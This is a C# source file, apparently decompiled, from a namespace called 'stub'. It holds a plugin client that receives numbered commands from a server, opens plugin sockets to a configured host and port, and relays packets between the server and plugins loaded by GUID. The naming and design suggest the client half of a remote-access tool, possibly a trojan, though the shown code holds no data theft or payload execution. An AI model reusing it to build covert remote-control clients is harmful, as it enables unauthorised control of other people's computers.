using System;
using System.Net.Sockets;

namespace stub
{
    class PluginClient
	{
		public static void HandleClose(ClientSocket client)
		{
			Plugin plugin = client.PluginConnect.Plugin;
			if (plugin != null)
            {
				try
                {
					plugin.PipeClosed(client.PluginConnect.string_0);
                }
                catch { }
            }

			if (Core.Client.connected)
				Core.Clients.Remove(client.PluginConnect.string_0);
		}

		public static void HandleConnect(ClientSocket client, bool connected)
		{
			Plugin plugin = client.PluginConnect.Plugin;
			if (connected)
			{
				Core.SendMessage(client, true, CommandType.BaseCommand, 2, new object[]
				{
					client.PluginConnect.string_0,
					client.PluginConnect.Guid
				});

				if (plugin != null)
                {
					try
                    {
						plugin.PipeCreated(client.PluginConnect.string_0);
					}
                    catch { }
				}
			}
			else
				HandleClose(client);
		}

		private static void HandleException(ClientSocket client, Exception ex)
		{
			if (ex is SocketException)
			{
				Console.WriteLine(ex);
				HandleClose(client);
			}
		}

		private static void HandlePacket(ClientSocket client, byte[] bytes)
		{
			PacketData data = Packet.ReadData(bytes);

			Plugin plugin = client.PluginConnect.Plugin;
			if (plugin != null)
            {
				try
                {
					plugin.ReadPacket(client.PluginConnect.string_0, data.Buffer);
				}
                catch { }
            }
		}

		public static void HandleCommand(PacketData data)
		{
			switch (data.Command)
			{
				case 1:
					List();
					break;
				case 2:
					Connect(data.Buffer);
					break;
				case 4:
					ReadMessage(data.Guid, data.Buffer);
					break;
				case 6:
					break;
				case 7:
					break;
			}
		}

		public static void List()
		{
			Core.HostStateChanged(true);
		}

		public static void Connect(object[] object_0)
		{
			string text = (string)object_0[0];
			Guid guid_ = (Guid)object_0[1];
			Guid guid = (Guid)object_0[2];

			if (Core.Clients.ContainsKey(text))
				return;

			ClientSocket client = new ClientSocket();
			client.HandlePacket = HandlePacket;
			client.HandleConnect = HandleConnect;
			client.HandleException = HandleException;

			Core.Clients.Add(text, client);

			Plugin plugin = null;
			if (!(guid == Guid.Empty))
				plugin = PluginManager.GetPluginData(guid).Plugin;

			client.PluginConnect = new PluginConnect(guid_, text, plugin);
			client.Connect(Core.Host, Core.Port);
		}

		public static void ReadMessage(Guid guid, object[] obj)
		{
			PluginInfo pluginData = PluginManager.GetPluginData(guid);
			if (pluginData != null)
			{
				try
				{
					pluginData.Plugin.ReadPacket(null, obj);
				}
				catch { }
			}
			else
				throw new Exception(string.Format("No instance of plugin '{0}' could be found.", guid));
		}

		public static void SendMessage(Guid guid, string string_0, string string_1, Version ver)
		{
			Core.SendMessage(Core.Client, true, CommandType.BaseCommand, 0, new object[]
			{
				guid,
				string_0,
				string_1,
				ver.ToString()
			});
		}
	}
}